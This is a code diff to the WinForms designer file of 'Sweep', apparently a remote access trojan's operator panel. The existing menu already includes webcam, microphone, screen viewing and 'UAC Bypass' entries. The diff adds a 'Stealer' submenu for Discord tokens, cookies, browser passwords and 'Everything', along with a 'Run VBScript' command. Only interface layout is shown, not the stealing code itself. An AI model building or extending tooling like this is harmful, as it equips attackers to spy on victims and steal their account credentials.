@@ -38,6 +38,11 @@ namespace Sweep.Forms
             this.microphoneToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.chatToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.uACBypassToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.stealerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.discordTokenToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.cookiesToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.passwordsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.runVBScriptToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.listView1 = new BrightIdeasSoftware.ObjectListView();
             this.portnum = new System.Windows.Forms.Label();
             this.clients = new System.Windows.Forms.Label();
@@ -49,6 +54,7 @@ namespace Sweep.Forms
             this.builder = new Guna.UI2.WinForms.Guna2Button();
             this.logs = new Guna.UI2.WinForms.Guna2Button();
             this.home = new Guna.UI2.WinForms.Guna2Button();
+            this.everythingToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.rat.SuspendLayout();
             ((System.ComponentModel.ISupportInitialize)(this.listView1)).BeginInit();
             ((System.ComponentModel.ISupportInitialize)(this.logsview)).BeginInit();
@@ -62,7 +68,9 @@ namespace Sweep.Forms
             this.webcam,
             this.microphoneToolStripMenuItem,
             this.chatToolStripMenuItem,
-            this.uACBypassToolStripMenuItem});
+            this.uACBypassToolStripMenuItem,
+            this.stealerToolStripMenuItem,
+            this.runVBScriptToolStripMenuItem});
             this.rat.Name = "rat";
             this.rat.RenderStyle.ArrowColor = System.Drawing.Color.FromArgb(((int)(((byte)(151)))), ((int)(((byte)(143)))), ((int)(((byte)(255)))));
             this.rat.RenderStyle.BorderColor = System.Drawing.Color.Gainsboro;
@@ -73,7 +81,7 @@ namespace Sweep.Forms
             this.rat.RenderStyle.SelectionForeColor = System.Drawing.Color.White;
             this.rat.RenderStyle.SeparatorColor = System.Drawing.Color.Gainsboro;
             this.rat.RenderStyle.TextRenderingHint = System.Drawing.Text.TextRenderingHint.SystemDefault;
-            this.rat.Size = new System.Drawing.Size(181, 136);
+            this.rat.Size = new System.Drawing.Size(181, 180);
             // 
             // seescreen
             // 
@@ -115,6 +123,51 @@ namespace Sweep.Forms
             this.uACBypassToolStripMenuItem.Text = "UAC Bypass";
             this.uACBypassToolStripMenuItem.Click += new System.EventHandler(this.uACBypassToolStripMenuItem_Click);
             // 
+            // stealerToolStripMenuItem
+            // 
+            this.stealerToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
+            this.discordTokenToolStripMenuItem,
+            this.cookiesToolStripMenuItem,
+            this.passwordsToolStripMenuItem,
+            this.everythingToolStripMenuItem});
+            this.stealerToolStripMenuItem.Image = global::Sweep.Properties.Resources.key_chain;
+            this.stealerToolStripMenuItem.Name = "stealerToolStripMenuItem";
+            this.stealerToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+            this.stealerToolStripMenuItem.Text = "Stealer";
+            // 
+            // discordTokenToolStripMenuItem
+            // 
+            this.discordTokenToolStripMenuItem.BackColor = System.Drawing.SystemColors.ControlLightLight;
+            this.discordTokenToolStripMenuItem.Image = global::Sweep.Properties.Resources.discord;
+            this.discordTokenToolStripMenuItem.Name = "discordTokenToolStripMenuItem";
+            this.discordTokenToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+            this.discordTokenToolStripMenuItem.Text = "Discord Token";
+            this.discordTokenToolStripMenuItem.Click += new System.EventHandler(this.discordTokenToolStripMenuItem_Click);
+            // 
+            // cookiesToolStripMenuItem
+            // 
+            this.cookiesToolStripMenuItem.BackColor = System.Drawing.SystemColors.ControlLightLight;
+            this.cookiesToolStripMenuItem.Image = global::Sweep.Properties.Resources.cookies;
+            this.cookiesToolStripMenuItem.Name = "cookiesToolStripMenuItem";
+            this.cookiesToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+            this.cookiesToolStripMenuItem.Text = "Cookies";
+            // 
+            // passwordsToolStripMenuItem
+            // 
+            this.passwordsToolStripMenuItem.BackColor = System.Drawing.SystemColors.ControlLightLight;
+            this.passwordsToolStripMenuItem.Image = global::Sweep.Properties.Resources.chrome;
+            this.passwordsToolStripMenuItem.Name = "passwordsToolStripMenuItem";
+            this.passwordsToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+            this.passwordsToolStripMenuItem.Text = "Browser Passwords";
+            // 
+            // runVBScriptToolStripMenuItem
+            // 
+            this.runVBScriptToolStripMenuItem.Image = global::Sweep.Properties.Resources.wscript_101;
+            this.runVBScriptToolStripMenuItem.Name = "runVBScriptToolStripMenuItem";
+            this.runVBScriptToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+            this.runVBScriptToolStripMenuItem.Text = "Run VBScript";
+            this.runVBScriptToolStripMenuItem.Click += new System.EventHandler(this.runVBScriptToolStripMenuItem_Click);
+            // 
             // listView1
             // 
             this.listView1.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
@@ -128,7 +181,7 @@ namespace Sweep.Forms
             this.listView1.RowHeight = 25;
             this.listView1.SelectedColumnTint = System.Drawing.Color.FromArgb(((int)(((byte)(15)))), ((int)(((byte)(0)))), ((int)(((byte)(120)))), ((int)(((byte)(215)))));
             this.listView1.ShowGroups = false;
-            this.listView1.Size = new System.Drawing.Size(899, 455);
+            this.listView1.Size = new System.Drawing.Size(899, 441);
             this.listView1.TabIndex = 1;
             this.listView1.UseCompatibleStateImageBehavior = false;
             this.listView1.View = System.Windows.Forms.View.Details;
@@ -137,7 +190,7 @@ namespace Sweep.Forms
             // 
             this.portnum.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
             this.portnum.AutoSize = true;
-            this.portnum.Location = new System.Drawing.Point(74, 462);
+            this.portnum.Location = new System.Drawing.Point(74, 448);
             this.portnum.Name = "portnum";
             this.portnum.Size = new System.Drawing.Size(54, 13);
             this.portnum.TabIndex = 2;
@@ -148,7 +201,7 @@ namespace Sweep.Forms
             // 
             this.clients.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
             this.clients.AutoSize = true;
-            this.clients.Location = new System.Drawing.Point(4, 462);
+            this.clients.Location = new System.Drawing.Point(4, 448);
             this.clients.Name = "clients";
             this.clients.Size = new System.Drawing.Size(66, 13);
             this.clients.TabIndex = 3;
@@ -172,7 +225,7 @@ namespace Sweep.Forms
             this.logsview.Location = new System.Drawing.Point(4, 3);
             this.logsview.Name = "logsview";
             this.logsview.ShowGroups = false;
-            this.logsview.Size = new System.Drawing.Size(899, 455);
+            this.logsview.Size = new System.Drawing.Size(899, 441);
             this.logsview.TabIndex = 7;
             this.logsview.UseCompatibleStateImageBehavior = false;
             this.logsview.View = System.Windows.Forms.View.Details;
@@ -200,6 +253,7 @@ namespace Sweep.Forms
             // 
             // counter
             // 
+            this.counter.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
             this.counter.BorderRadius = 3;
             this.counter.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
             this.counter.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
@@ -217,7 +271,7 @@ namespace Sweep.Forms
             // 
             // builder
             // 
-            this.builder.Anchor = System.Windows.Forms.AnchorStyles.Right;
+            this.builder.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
             this.builder.Animated = true;
             this.builder.BorderColor = System.Drawing.Color.LightGray;
             this.builder.BorderRadius = 3;
@@ -239,7 +293,7 @@ namespace Sweep.Forms
             // 
             // logs
             // 
-            this.logs.Anchor = System.Windows.Forms.AnchorStyles.Right;
+            this.logs.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
             this.logs.Animated = true;
             this.logs.BorderColor = System.Drawing.Color.LightGray;
             this.logs.BorderRadius = 3;
@@ -262,7 +316,7 @@ namespace Sweep.Forms
             // 
             // home
             // 
-            this.home.Anchor = System.Windows.Forms.AnchorStyles.Right;
+            this.home.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
             this.home.Animated = true;
             this.home.BorderColor = System.Drawing.Color.LightGray;
             this.home.BorderRadius = 3;
@@ -282,12 +336,19 @@ namespace Sweep.Forms
             this.home.TabIndex = 4;
             this.home.Click += new System.EventHandler(this.home_Click);
             // 
+            // everythingToolStripMenuItem
+            // 
+            this.everythingToolStripMenuItem.BackColor = System.Drawing.SystemColors.ControlLightLight;
+            this.everythingToolStripMenuItem.Name = "everythingToolStripMenuItem";
+            this.everythingToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+            this.everythingToolStripMenuItem.Text = "Everything";
+            // 
             // Sweep
             // 
             this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
             this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
             this.BackColor = System.Drawing.SystemColors.ControlLightLight;
-            this.ClientSize = new System.Drawing.Size(983, 481);
+            this.ClientSize = new System.Drawing.Size(983, 467);
             this.Controls.Add(this.counter);
             this.Controls.Add(this.builder);
             this.Controls.Add(this.logs);
@@ -328,5 +389,11 @@ namespace Sweep.Forms
         private BrightIdeasSoftware.OLVColumn Message;
         private BrightIdeasSoftware.OLVColumn Type;
         private Guna.UI2.WinForms.Guna2GradientButton counter;
+        private ToolStripMenuItem stealerToolStripMenuItem;
+        private ToolStripMenuItem discordTokenToolStripMenuItem;
+        private ToolStripMenuItem cookiesToolStripMenuItem;
+        private ToolStripMenuItem passwordsToolStripMenuItem;
+        private ToolStripMenuItem runVBScriptToolStripMenuItem;
+        private ToolStripMenuItem everythingToolStripMenuItem;
     }
 }
